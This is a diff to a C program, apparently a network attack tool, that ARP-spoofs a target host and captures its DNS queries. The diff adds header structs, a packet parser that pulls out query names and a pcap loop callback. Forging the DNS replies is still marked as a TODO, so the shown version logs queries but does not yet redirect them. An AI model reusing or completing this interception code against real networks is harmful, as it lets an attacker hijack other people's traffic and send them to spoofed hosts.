@@ -11,6 +11,10 @@
 #include <stdlib.h>
 #include <pcap.h>
 #include <string.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+
+#define ETH_ADDR_SIZE 6
 
 void arp_spoof(char *host, char *interface){
   	libnet_t *ln;
@@ -47,7 +51,56 @@ void arp_spoof(char *host, char *interface){
 	libnet_destroy(ln);
 }
 
-void dns_spoof(char *interface){
+struct ethhdr{
+	u_char eth_dst[ETH_ADDR_SIZE];
+	u_char eth_src[ETH_ADDR_SIZE];
+	u_short ether_type;
+};
+
+struct dnshdr{
+	char id[2];
+	char flags[2];
+	char qdcount[2];
+	char ancount[2];
+	char nscount[2];
+	char arcount[2];
+};
+
+struct dnsquery{
+	char *qname;
+	char qtype[2];
+	char qclass[2];
+};
+
+void process_dns_query(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query){
+	struct ethhdr *eth;
+	struct iphdr *ip;
+	struct udphdr *udp;
+
+	eth = (struct ethhdr*)(packet);
+	ip = (struct iphdr*)(((char*) eth) + sizeof(struct ethhdr));
+	//TODO: extract src and dest ip
+	unsigned int ip_hdr_size = ip->ihl*4;
+	udp = (struct udphdr *)(((char*) ip) + ip_hdr_size);
+	//TODO: extract port from udp
+
+	*dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
+	dns_query -> qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
+}
+
+void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes){
+	printf("%dB of %dB\n", h->caplen, h-> len);
+	
+	struct dnshdr *dns_hdr;
+	struct dnsquery dns_query;
+	
+	process_dns_query(bytes, &dns_hdr, &dns_query);
+	printf("Captured query: %s\n", dns_query.qname);
+
+	//TODO: build and send fake answer
+}
+
+void dns_spoof(char *host, char *interface){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *handle;
 	char filter[32];
@@ -69,8 +122,8 @@ void dns_spoof(char *interface){
 		printf("dns_spoof: error setting filter: %s\n", pcap_geterr(handle));
 	}
 	
-	//	TODO: pcap_loop with trap function sending fake answers
-
+	pcap_loop(handle, -1, trap, (u_char*)host);
+	
 	pcap_freecode(&fp);
 	pcap_close(handle);
 }
@@ -81,7 +134,7 @@ int main(int argc, char** argv) {
 		exit(-1);
 	}
   	arp_spoof(argv[1], argv[2]);
-	dns_spoof(argv[2]);
+	dns_spoof(argv[1], argv[2]);
 	
   	return EXIT_SUCCESS;
 }
